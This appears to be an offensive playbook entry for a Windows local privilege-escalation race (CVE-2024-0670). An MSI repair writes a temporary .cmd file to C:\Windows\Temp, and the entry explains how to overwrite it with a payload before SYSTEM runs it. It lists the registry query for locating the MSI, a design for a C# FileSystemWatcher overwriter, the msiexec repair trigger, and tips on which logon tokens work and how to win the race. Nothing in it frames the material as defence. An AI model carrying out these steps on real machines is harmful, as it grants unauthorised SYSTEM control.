# MSI Repair TOCTOU Race (e.g., CVE-2024-0670)

## When this applies

- Windows target with installed software whose MSI custom actions create+execute temp cmd files in `C:\Windows\Temp` as SYSTEM.
- Goal: race-overwrite the temp file before SYSTEM executes it.

## Steps

```
# When software MSI custom actions create+execute temp cmd files in C:\Windows\Temp as SYSTEM:
# 1. Find the installed MSI path
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products" /s /f "ProductName"
# 2. Compile a C# FileSystemWatcher binary (PS/batch polling is TOO SLOW for the race):
#    - Watch C:\Windows\Temp for cmk_*.cmd (or equivalent pattern)
#    - On Created/Changed event: immediately overwrite with payload
#    - Also poll every 5ms as backup
# 3. Run the watcher, then trigger: msiexec /fa "C:\Windows\Installer\<hash>.msi" /qn
# KEY CONSTRAINTS:
# - msiexec requires MSI service access — only works from INTERACTIVE logon tokens
#   (scheduled tasks work, WinRM/webshell network tokens do NOT)
# - PowerShell/batch polling loses the race — compiled FileSystemWatcher binary required
# - Read-only pre-seeded files do NOT work: custom action skips both write AND execute
```

## Verifying success

- The overwritten temp file's payload runs as SYSTEM during the MSI repair.

## Common pitfalls

- Network logon tokens (WinRM, webshell) cannot access the MSI service — must use INTERACTIVE token (scheduled task, RDP).
- PowerShell/batch polling is too slow — must use a compiled C# FileSystemWatcher.
- Pre-seeding a read-only file does NOT work; the custom action skips both write AND execute.

## Tools

- C# `FileSystemWatcher`
- msiexec
- reg query
